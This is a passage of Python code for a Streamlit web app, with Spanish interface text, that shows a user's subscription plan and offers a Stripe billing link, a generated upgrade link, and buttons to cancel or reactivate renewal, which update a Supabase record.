            estado_texto = "ACTIVO"
            color_estado = "#00FFCC"
            texto_fecha = f"Próxima renovación: {fecha_calculada}"

        st.markdown(f"""
        <div style="background: linear-gradient(180deg, #161b22 0%, #121820 100%); border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 24px rgba(0,0,0,0.22);">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <div style="color: #8b949e; font-size: 0.9rem; margin-bottom: 5px;">Plan Actual</div>
                    <div style="color: #ffffff; font-size: 1.8rem; font-weight: bold; font-family: 'Outfit', sans-serif;">{plan_actual}</div>
                </div>
                <div style="text-align: right;">
                    <div style="color: {color_estado}; font-size: 1rem; font-weight: bold;">Estado: {estado_texto}</div>
                    <div style="color: #8b949e; font-size: 0.85rem;">{texto_fecha}</div>
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)
        
        col_b1, col_b2 = st.columns(2)
        with col_b1:
            st.link_button(" Gestionar Tarjetas en Stripe", url="https://billing.stripe.com", width='stretch')
        with col_b2:
            email_pago = st.session_state.get("email_usuario", "")
            usuario_logueado = bool(st.session_state.get("usuario_autenticado")) and bool(email_pago)
            if usuario_logueado:
                try:
                    if plan_actual == "Pro":
                        price_id = STRIPE_PRICES["enterprise_recurrente"]
                        tipo_compra = "enterprise_recurrente"
                    else:
                        price_id = STRIPE_PRICES["pro_recurrente"]
                        tipo_compra = "pro_recurrente"
                    url_upgrade = generar_link_pago(price_id, email_pago, tipo_compra, "subscription")
                    st.link_button(
                        "⬆ Mejorar a Enterprise" if plan_actual == "Pro" else "⬆ Mejorar a Plan Pro",
                        url=url_upgrade,
                        type="primary",
                        width='stretch',
                    )
                except Exception as e:
                    st.error(f"No se pudo generar el enlace de upgrade: {e}")
            else:
                st.info("Inicia sesión para habilitar el pago.")
            
        st.markdown("---")
        with st.expander("Cancelación de la suscripción"):
            if plan_actual == 'Basic':
                st.info("Actualmente estás en el plan gratuito. No hay ninguna suscripción activa que cancelar.")
            
            elif st.session_state['cancelacion_pendiente']:
                st.warning("Tu suscripción ya está programada para cancelarse. Seguirás teniendo acceso a tus beneficios premium hasta el final del periodo facturado.")
                if st.button(" Reactivar Suscripción "):
                    st.session_state['cancelacion_pendiente'] = False
                    actualizar_usuario_supabase(email_usuario, 'cancelacion_pendiente', False)
                    st.toast("✅ ¡Qué alegría que te quedes! Suscripción reactivada.")
                    time.sleep(1.5)
                    st.rerun()
            
            else:
                st.warning("Al cancelar, no se te volverán a cobrar más mensualidades. Mantendrás tu acceso Pro/Enterprise y tus API Keys activas hasta el final de tu ciclo de facturación actual.")
                if st.button("🗑️ Cancelar Renovación"):
                    st.session_state['cancelacion_pendiente'] = True
                    actualizar_usuario_supabase(email_usuario, 'cancelacion_pendiente', True)
                    st.toast("⚠️ Suscripción cancelada. Mantienes el acceso hasta fin de mes.")
                    time.sleep(1.5)
                    st.rerun()